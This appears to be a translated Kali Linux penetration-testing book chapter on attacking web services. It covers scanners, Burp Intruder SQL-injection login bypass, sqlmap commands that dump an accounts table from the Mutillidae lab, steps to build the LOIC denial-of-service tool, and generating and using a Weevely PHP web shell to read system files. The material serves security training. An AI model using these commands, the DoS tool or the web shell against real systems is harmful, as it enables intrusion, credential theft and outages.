nmap 脚本识别出 WAF 的存在；然而，对脚本的测试表明，它在发现方面并不总是准确的，返回的数据可能过于一般化，无法指导有效的绕过防火墙的策略。

wafw00f 脚本是一个自动化工具，用于识别和指纹 Web 防火墙；测试表明，它是最准确的工具。该脚本可以轻松从 Kali 中调用，并在以下截图中显示了大量输出：

![对网站进行侦察](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_02.jpg)

**负载均衡检测器**（**lbd**）是一个 bash shell 脚本，用于确定给定域名是否使用 DNS 和/或 HTTP 负载均衡。这对于测试人员来说是重要信息，因为当测试一个服务器，然后负载均衡器将请求转发到另一个服务器时，可以解释看似异常的结果。Lbd 使用各种检查来识别负载平衡的存在；以下截图显示了一个示例输出：

![对网站进行侦察](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_03.jpg)

应检查网站以确定可能用于构建和维护网站的 CMS。诸如 Drupal、Joomla 和 WordPress 等 CMS 应用程序可能配置有易受攻击的管理界面，允许访问提升的权限，或者可能包含可利用的漏洞。

Kali 包括一个自动化扫描程序**BlindElephant**，用于指纹识别 CMS 以确定版本信息。以下截图显示了一个示例输出：

![对网站进行侦察](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_04.jpg)

BlindElephant 审查 CMS 的组件指纹，然后提供了存在版本的最佳猜测。然而，与其他应用程序一样，我们发现它可能无法检测到存在的 CMS；因此，始终要根据其他爬行网站特定目录和文件的扫描器的结果进行验证，或者手动检查网站。

一种特定的扫描工具，自动网络爬虫，可用于验证已收集的信息，以及确定特定网站的现有目录和文件结构。网络爬虫的典型发现包括管理门户、配置文件（当前和以前的版本）可能包含硬编码访问凭据和内部结构信息、网站的备份副本、管理员注释、机密个人信息和源代码。

Kali 支持多个网络爬虫，包括 Burp Suite、DirBuster、OWASP-ZAP、Vega、WebScarab 和 WebSlayer。最常用的工具是 DirBuster。

DirBuster 是一个使用可能的目录和文件列表进行暴力分析网站结构的 GUI 驱动应用程序。响应可以以列表或树状格式查看，更准确地反映了网站的结构。执行该应用程序针对目标网站的输出如下截图所示：

![对网站进行侦察](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_05.jpg)

还可以直接复制网站到测试人员的位置。这种“网站克隆”允许测试人员有时间审查目录结构及其内容，从本地文件中提取元数据，并使用网站内容作为`crunch`等程序的输入，以生成支持密码破解的个性化字典。

要将网站克隆到本地系统，请使用 HTTrack。如果 Kali 中没有该软件，可以使用`apt-get`命令进行下载，然后在命令提示符中输入`httrack`来执行。您将被提示选择一个目录位置来存储下载的网站。程序执行完毕后，您将拥有目标网站的备份。

一旦您已经映射出正在交付的网站和/或 Web 服务的基本结构，杀伤链的下一个阶段是识别可以利用的漏洞。

# 漏洞扫描仪

使用自动化工具进行漏洞扫描可能存在问题。Web 漏洞扫描仪遭受所有扫描仪的常见缺点（扫描仪只能检测已知漏洞的签名；它们无法确定漏洞是否实际可利用；存在高比例的*假阳性*报告）。此外，Web 漏洞扫描仪无法识别业务逻辑中的复杂错误，并且它们无法准确模拟黑客使用的复杂链式攻击。

为了提高可靠性，大多数渗透测试人员使用多种工具来扫描 Web 服务；当多个工具报告可能存在特定漏洞时，这种共识将指导测试人员需要手动验证的区域。

Kali 配备了大量用于 Web 服务的漏洞扫描仪，并提供了一个稳定的平台，用于安装新的扫描仪并扩展其功能。这使得渗透测试人员可以通过选择扫描工具来增加测试的有效性：

+   最大化测试的完整性（已识别的漏洞的总数）和准确性（真实的漏洞而不是假阳性结果）。

+   最小化获取可用结果所需的时间。

+   最小化对正在测试的 Web 服务的负面影响。这可能包括由于流量增加而导致系统减速。例如，最常见的负面影响之一是由于测试将数据输入到数据库然后通过电子邮件向个人提供已经进行的更改的更新的表单而导致的—对这些表单的不受控制的测试可能导致发送超过 30,000 封电子邮件！

选择最有效的工具存在相当大的复杂性。除了已列出的因素外，一些漏洞扫描仪还将启动适当的利用并支持后利用活动。对于我们的目的，我们将考虑所有扫描可利用弱点的工具为“漏洞扫描仪”。Kali 提供了对几种不同的漏洞扫描仪的访问，包括以下内容：

+   扩展传统漏洞扫描仪的功能以包括网站和相关服务（Metasploit Framework 和 Websploit）

+   扩展功能以支持 Web 服务漏洞扫描（OWASP Mantra）的非传统应用程序的扫描仪

+   专门开发以支持网站和 Web 服务中的侦察和利用检测的扫描仪（Arachnid、Nikto、Skipfish、Vega、w3af 等）

## 扩展传统漏洞扫描仪的功能

这种类型的漏洞扫描仪的最佳示例是 Metasploit Framework of Rapid7 中打包的`wmap`模块。要使用此模块，您必须首先确保`postgresql`数据库服务已启动；使用以下命令：

```
root@kali:~# service postgresql start 

```

接下来，从命令提示符启动`msfconsole`并输入`load wmap`命令。与大多数框架应用程序一样，在命令提示符中输入`help`或`-h`将显示可用于使用的命令。

管理目标站点，请使用`wmap_sites`命令。`-a`选项将目标的 IP 地址添加到应用程序的数据库中。`-l`选项提供了一个可用站点的列表，用于测试目标，如下面的截图所示：

![扩展传统漏洞扫描器功能](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_06.jpg)

选择目标后，测试人员现在可以使用以下命令运行`wmap`模块：

```
msf> wmap_run –e

```

上一个命令的执行显示在以下截图中：

![扩展传统漏洞扫描器功能](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_07.jpg)

执行此命令可能需要一些时间才能完成（这取决于网站页面的数量，以及网站的结构复杂性，以及所选模块操作以检测漏洞的方式）。

Metasploit 框架并不是为网站和网络服务的复杂性而设计的；这在使用该产品与使用专门为网站和网络服务设计的漏洞扫描器所得到的有限发现数量中是可见的。然而，由于它始终在更新，值得监控其扫描能力的变化。

**Websploit**应用程序还使用`wmap`模块。

## 扩展 Web 浏览器功能

Web 浏览器被设计用于与 Web 服务交互。因此，它们被选为漏洞评估和利用工具是很自然的。

这种工具集的最佳示例是 OWASP 的 Mantra——一个建立在 Firefox 网络浏览器上的第三方安全实用程序集。OWASP 的 Mantra 支持 Windows、Linux 和 Macintosh 测试系统，并提供支持以下活动的实用程序：

+   **信息收集**：这些实用程序提供被动侦察，报告目标的物理位置，揭示底层站点技术，并搜索和测试站点的超链接

+   **编辑器**：一组编辑、调试和监视 HTML、CSS 和 JavaScript 的实用程序

+   **代理**：提供代理管理工具的实用程序，包括 FoxyProxy，这是一个方便在代理之间切换的工具

+   **网络实用程序**：这些实用程序提供 FTP 和 SSH 通信的客户端，并简化 DNS 缓存管理。

+   **应用程序审计**：这些工具在各种用户代理之间切换，访问 Web 开发人员工具，控制每个站点发送的 HTTP 引用者，查找 SQL 注入和 XSS 漏洞，允许测试人员篡改数据，并访问 Websecurify 工具

+   **杂项**：生成脚本，管理会话和下载，并访问加密、解密和哈希标签功能

Mantra 框架可用于促进对网站的半自动侦察。

在以下截图中显示的示例中，Mutillidae 登录页面已在 Mantra 浏览器中打开。使用下拉菜单（从右上角的蓝色标志激活），从可用工具中选择了 SQL Inject Me 应用程序，并显示在左侧面板中。

![扩展 Web 浏览器功能](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_08.jpg)

## 特定于 Web 服务的漏洞扫描器

漏洞扫描器是自动化工具，用于爬行应用程序以识别已知漏洞的签名。

Kali 预装了几种不同的漏洞扫描器；可以通过导航到**Kali Linux** | **Web 应用程序** | **Web 漏洞扫描器**来访问它们。渗透测试人员通常会针对同一目标使用两到三个综合扫描器，以确保有效的结果。请注意，一些漏洞扫描器还包括攻击功能。

漏洞扫描器相当“喧闹”，通常会被受害者检测到。然而，扫描经常被忽略作为互联网上的常规后台探测的一部分。事实上，一些攻击者已知会对目标发起大规模扫描，以掩盖真正的攻击或诱使防御者禁用检测系统，以减少他们需要管理的报告的涌入。

对最重要的漏洞扫描器进行快速调查包括以下内容：

| 应用 | 描述 |
| --- | --- |
| Arachnid | 一个分析扫描期间接收的 HTTP 响应以验证响应并消除误报的开源 Ruby 框架。 |
| GoLismero | 它映射 Web 应用程序并检测常见的漏洞。结果以 TXT、CVS、HTML 和 RAW 格式保存。 |
| Nikto | 一个基于 Perl 的开源扫描器，允许 IDS 回避和用户更改扫描模块；然而，这个“原始”的网络扫描器开始显露其年龄，不如一些更现代的扫描器准确。 |
| Skipfish | 这个扫描器完成递归爬行和基于字典的爬行，生成一个带有来自其他漏洞扫描输出的交互式站点地图。 |
| Vega | 这是一个基于 GUI 的开源漏洞扫描器。由于它是用 Java 编写的，它是跨平台的（Linux、OS X 和 Windows），并且可以由用户定制。 |
| w3af | 这个扫描器为全面的 Python 测试平台提供了图形和命令行界面。它映射目标网站并扫描漏洞。这个项目被 Rapid7 收购，所以将来会与 Metasploit 框架更紧密地集成。 |
| Wapiti | 这是一个基于 Python 的开源漏洞扫描器。 |
| Webscarab | 这是 OWASP 基于 Java 的框架，用于分析 HTTP 和 HTTPS 协议。它可以充当拦截代理、模糊器和简单的漏洞扫描器。 |
| Webshag | 这是一个基于 Python 的网站爬虫和扫描器，可以利用复杂的 IDS 回避。 |
| Websploit | 这是一个针对有线和无线网络攻击的框架。 |

大多数测试人员开始使用 Nikto 来测试网站，这是一个简单的扫描器（特别是在报告方面），通常提供准确但有限的结果；这个扫描的样本输出如下图所示：

![Web-service-specific vulnerability scanners](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_09.jpg)

接下来要使用更先进的扫描器，扫描更多的漏洞；反过来，它们可能需要更长的时间才能完成。复杂的漏洞扫描（由要扫描的页面数量和站点的复杂性决定，可能包括允许用户输入的多个页面，如搜索功能或收集用户数据的表单，用于后端数据库）通常需要几天的时间才能完成。

根据发现的已验证漏洞数量，最有效的扫描器之一是 Subgraph 的 Vega。如下图所示，它扫描目标并将漏洞分类为高、中、低或信息。测试人员可以点击识别的结果“深入”到具体的发现。测试人员还可以修改用 Java 编写的搜索模块，以便专注于特定的漏洞或识别新的漏洞。

![Web-service-specific vulnerability scanners](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_10.jpg)

另一个值得使用的扫描器是**Web 应用攻击和审计框架**（**w3af**），这是一个基于 Python 的开源 Web 应用安全扫描器。它提供了预配置的漏洞扫描，支持 OWASP 等标准。扫描器的广泛选项是有代价的——它花费的时间比其他扫描器长得多，并且在长时间的测试期间容易出现故障。下面的屏幕截图显示了一个配置为对样本网站进行全面审计的 w3af 实例：

![Web-service-specific vulnerability scanners](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_11.jpg)

Kali 还包括一些特定应用的漏洞扫描器。例如，WPScan 专门针对**WordPress CMS**应用程序。

# 使用客户端代理进行安全测试

与自动化漏洞扫描器不同，客户端代理需要大量人工交互才能发挥作用。客户端代理拦截 HTTP 和 HTTPS 流量，允许渗透测试人员检查用户和应用程序之间的通信。它允许测试人员复制数据或与发送到应用程序的请求进行交互。

Kali 自带了几个客户端代理，包括 Burp Suite、OWASP ZAP、Paros、ProxyStrike、漏洞扫描器 Vega 和 WebScarab。经过广泛测试，我们已经开始依赖 Burp Proxy，并将 ZAP 作为备用工具。

Burp 主要用于拦截 HTTP(S)流量；然而，它是一个更大工具套件的一部分，具有几个额外的功能，包括：

+   一个能够识别网站的应用程序感知蜘蛛

+   漏洞扫描器，包括一个用于测试会话令牌随机性的顺序器，以及一个用于在客户端和网站之间操纵和重新发送请求的重复器（漏洞扫描器未包含在 Kali 打包的 Burp 代理的免费版本中）

+   一个可以用来发起定制攻击的入侵者工具（Kali 包含的免费版本工具有速度限制；如果购买了软件的商业版本，则这些限制将被移除）

+   编辑现有插件或编写新插件以扩展可以使用的攻击数量和类型的能力

要使用 Burp，请确保您的网络浏览器配置为使用本地代理；通常，您需要调整网络设置以指定 HTTP 和 HTTPS 流量必须使用本地主机（127.0.0.1）的 8080 端口。

设置浏览器和代理一起工作后，手动映射应用程序。这是通过关闭代理拦截，然后浏览整个应用程序来完成的。跟踪每个链接，提交表单，并尽可能多地登录到网站的各个区域。额外的内容将从各种响应中推断出来。站点地图将在**目标**选项卡下的一个区域中填充（也可以通过右键单击站点并选择**Spider This Host**来使用自动化爬行；然而，手动技术给了测试人员深入了解目标的机会，并且可能识别需要避免的区域）。

目标映射完成后，通过选择站点地图中的分支并使用**添加到范围**命令来定义目标-范围。完成后，您可以使用显示过滤器隐藏站点地图上不感兴趣的项目。下面的截图显示了目标网站的站点地图：

![使用客户端代理进行安全测试](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_12.jpg)

爬行完成后，手动审查目录和文件列表，查看是否有任何看起来不属于公共网站的结构，或者无意中泄露的内容。例如，名为 admin、backup、documentation 或 notes 的目录应该进行手动审查。

使用单引号作为输入手动测试登录页面产生了一个错误代码，表明可能容易受到 SQL 注入攻击的影响；错误代码的示例返回如下截图所示：

![使用客户端代理进行安全测试](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_13.jpg)

代理的真正优势在于其拦截和修改命令的能力。对于这个特定的例子，我们将使用 Mutillidae 网站——这是作为 Metasploitable 测试框架的一部分安装的一个“破损”网站，用于执行绕过 SQL 注入认证的攻击。

要发动这种攻击，请确保 Burp 代理已配置为拦截通信，方法是转到**代理**选项卡，然后选择**拦截**子选项卡。单击**拦截已打开**按钮，如下一张屏幕截图所示。完成后，打开浏览器窗口，并输入`<IP 地址>/mutillidae/index.php?page=login.php`以访问 Mutillidae 登录页面。在名称和密码字段中输入变量，然后单击登录按钮。

如果返回到 Burp 代理，您会看到用户在网页表单中输入的信息已被拦截。

![使用客户端代理测试安全性](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_14.jpg)

单击**操作**按钮，然后选择**发送到入侵者**选项。打开主**入侵者**选项卡，您将看到四个子选项卡——**目标**、**位置**、**有效载荷**和**选项**，如下一张屏幕截图所示。如果选择**位置**，您将看到从拦截信息中识别出的五个有效载荷位置。

![使用客户端代理测试安全性](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_15.jpg)

这种攻击将使用 Burp 代理的狙击手模式，它从测试人员提供的列表中获取单个输入，并将此输入逐个发送到单个有效载荷位置。在本例中，我们将针对用户名字段进行攻击，我们怀疑该字段基于返回的错误消息是易受攻击的。

为了定义有效载荷位置，我们选择子选项卡**有效载荷**。

![使用客户端代理测试安全性](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_16.jpg)

要发动攻击，请从顶部菜单中选择**入侵者**，然后选择**开始攻击**。代理将迭代字典攻击所选有效载荷位置，作为合法的 HTTP 请求，并返回服务器的状态代码。如下一张屏幕截图所示，大多数选项产生**200**状态代码（请求成功）；但是，一些数据返回**302**状态代码（找到请求；表示所请求的资源目前位于不同的 URI 下）。

![使用客户端代理测试安全性](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_17.jpg)

**302**状态表示成功的攻击，并且获取的数据可以用于成功登录到目标站点。

不幸的是，这只是对 Burp 代理及其功能的简要概述。Kali 附带的免费版本对许多测试任务已经足够；但是，严肃的测试人员（和攻击者）应考虑购买商业版本。

# 服务器漏洞利用

由于它们拥有广泛的“攻击面”（通信渠道、客户端软件、服务器操作系统、应用程序、中间件和后端数据库），Web 服务容易受到多种攻击类型的攻击。可能的攻击范围需要一本专门的书来描述；因此，我们只会展示一些类型，以突出 Kali 的功能。

在本示例中，我们将演示 Kali 如何用于对网络服务器发动拒绝服务（**DoS**）攻击。

一般来说，攻击提供 Web 服务的主机操作系统遵循先前描述的方法；但是，它们的架构特别容易受到 DoS 攻击。

Kali 包括几个被描述为压力测试应用程序的工具，因为它们模拟对服务器的高活动负载，以评估其对额外压力的应对能力。如果服务器或其应用程序失败，则它已遭受 DoS 攻击。

许多工具依赖于 IPv4 系统无法处理更新的 IPv6 协议（denail6、dos-new-ip6、flood_advertise6 等）。

然而，最成功的 DoS 攻击工具——**低轨道离子炮**（**LOIC**）——必须通过以下步骤手动添加到 Kali 中：

1.  使用`apt-get install`命令，安装以下软件包及其依赖项：`mono-gmcs`、`mono-mcs`、`monodevelop`和`liblog4net-cil-dev`。

1.  从 GitHub（[`github.com/NewEraCracker/LOIC/downloads`](https://github.com/NewEraCracker/LOIC/downloads)）下载 LOIC 到一个单独的文件夹中。使用解压命令将压缩文件解压到文件夹中。

1.  转到文件夹并使用以下命令编译应用程序：

```
mdtool build

```

1.  应用程序的编译版本将位于`/<path> bin/Debug/LOIC.exe`目录中。

输入攻击参数后，LOIC 可以针对目标网站启动。攻击使用直观的 GUI 界面启动，如下截图所示：

![服务器利用](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_18.jpg)

# 特定应用程序的攻击

特定应用程序的攻击数量超过了针对特定操作系统的攻击；考虑到可能影响每个在线应用程序的错误配置、漏洞和逻辑错误，令人惊讶的是任何应用程序都可以被认为是“安全”的。我们将重点介绍一些针对 Web 服务的重要攻击。

## 暴力破解访问凭证

针对网站或其服务的最常见的初始攻击之一是针对访问认证的暴力破解攻击——猜测用户名和密码。这种攻击成功率很高，因为用户倾向于选择易记的凭据或重复使用凭据，而且系统管理员经常不控制多次访问尝试。

Kali 自带 hydra，一个命令行工具，以及带有 GUI 界面的 hydra-gtk。这两个工具允许测试人员针对指定的服务暴力破解或迭代可能的用户名和密码。支持多种通信协议，包括 FTP、FTPS、HTTP、HTTPS、ICQ、IRC、LDAP、MySQL、Oracle、POP3、pcAnywhere、SNMP、SSH、VNC 等。以下截图显示了 hydra 使用暴力破解攻击来确定 HTTP 页面上的访问凭证：

![暴力破解访问凭证](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_19.jpg)

## 对数据库的注入攻击

网站中最常见且可利用的漏洞是注入漏洞，当受害网站不监控用户输入时，攻击者可以与后端系统进行交互。攻击者可以构造输入数据来修改或窃取数据库中的内容，将可执行文件放置到服务器上，或向操作系统发出命令。

评估 SQL 注入漏洞最有用的工具之一是**sqlmap**，这是一个 Python 工具，可以自动进行对 Firebird、Microsoft SQL、MySQL、Oracle、PostgreSQL、Sybase 和 SAP MaxDB 数据库的侦察和利用。

我们将演示对 Mutillidae 数据库的 SQL 注入攻击。第一步是确定 Web 服务器、后端数据库管理系统和可用的数据库。

启动一个 Metasploitable 虚拟机，并访问 Mutillidae 网站。完成后，查看网页，以确定接受用户输入的页面（例如，接受远程用户的用户名和密码的用户登录表单）；这些页面可能容易受到 SQL 注入攻击。然后，打开 Kali，并从命令提示符输入以下内容（使用适当的目标 IP 地址）：

```
root@kali:~# sqlmap -u 
  'http://192.168.75.129/mutillidae/index.php?page=user-
  info.php&username=admin&password=&user-info-php-submit-
  button=View+Account+Details' --dbs 

```

Sqlmap 将返回数据，如下截图所示：

![对数据库的注入攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_20.jpg)

最有可能存储应用程序数据的数据库是`owasp10`数据库；因此，我们将使用以下命令检查该数据库的所有表：

```
root@kali:~# sqlmap -u 
  'http://192.168.75.129/mutillidae/index.php?page=user-
  info.php&username=admin&password=&user-info-php-submit-
  button=View+Account+Details' –D owasp10 --tables 

```

执行该命令后返回的数据显示在以下截图中：

![对数据库的注入攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_21.jpg)

在枚举的六个表中，有一个名为`accounts`。我们将尝试从表的这一部分中转储数据。如果成功，帐户凭据将允许我们在进一步的 SQL 注入攻击失败时返回到数据库。要转储凭据，请使用以下命令：

```
root@kali:~# sqlmap -u 
  'http://192.168.75.129/mutillidae/index.php?page=user-
  info.php&username=admin&password=&user-info-php-submit-
  button=View+Account+Details' –D owasp10 – T accounts --dump 

```

![对数据库的注入攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_22.jpg)

类似的攻击也可以用于数据库，以提取信用卡号码。

# 使用 Web 后门维持访问

一旦 Web 服务器及其服务被攻破，就很重要确保可以保持安全访问。通常使用 Web shell 来实现这一点——这是一个提供隐蔽后门访问并允许使用系统命令来促进后期利用活动的小型程序。

Kali 自带了几个 Web shell；在这里我们将使用一个名为**Weevely**的流行 PHP Web shell。

Weevely 模拟 Telnet 会话，并允许测试者或攻击者利用 30 多个模块进行后期利用任务，包括以下内容：

+   浏览目标文件系统

+   与受攻击系统之间的文件传输

+   执行常见服务器配置错误的审计

+   通过目标系统对 SQL 账户进行暴力破解

+   生成反向 TCP shell

+   在已经受到攻击的远程系统上执行命令，即使已经应用了 PHP 安全限制

最后，Weevely 努力隐藏 HTTP cookie 中的通信，以避免被检测。要创建 Weevely，请从命令提示符中发出以下命令：

```
root@kali:~# weevely generate <password> <path>

```

这将在根目录中创建文件`weevely.php`。在已经受到攻击的远程系统上执行命令，即使已经应用了 PHP 安全限制：

![使用 Web 后门维持访问](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_23.jpg)

使用文件上传漏洞或任何其他受损，包括可以访问 meterpreter 文件上传功能的漏洞，将`weevely.php`上传到受攻击的网站。

要与 Web shell 通信，请从命令提示符中发出以下命令，确保目标 IP 地址、目录和密码变量已更改以反映受攻击系统的情况：

```
root@kali:~# weevely http://<target IP address> <directory> 
  <password> 

```

在下面的屏幕截图示例中，我们已经验证了使用`whoami`命令（用于识别正确的目录）和`ls`命令（用于获取文件列表，再次确认连接源为`weevely.php`）。使用`cat /etc/password`命令查看密码。

![使用 Web 后门维持访问](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_24.jpg)

Web shell 还可以用于建立反向 shell 连接到测试者，使用 Netcat 或 Metasploit Framework 作为本地监听器。

# 总结

在本章中，我们从攻击者的角度审查了网站及其为授权用户提供的服务。我们应用了杀伤链视角来理解对 Web 服务的正确应用侦察和漏洞扫描。

介绍了几种不同的漏洞扫描器；我们重点是对现有扫描器进行修改以支持网站和 Web 服务的评估，使用基于浏览器的漏洞扫描器，以及专门设计用于评估网站及其服务的漏洞扫描器。我们只审查了少数几个利用，最后通过对专门用于 Web 服务的 Web shell 进行了审查。

在下一章中，我们将学习如何识别和攻击将用户连接到 Web 服务的远程访问通信。

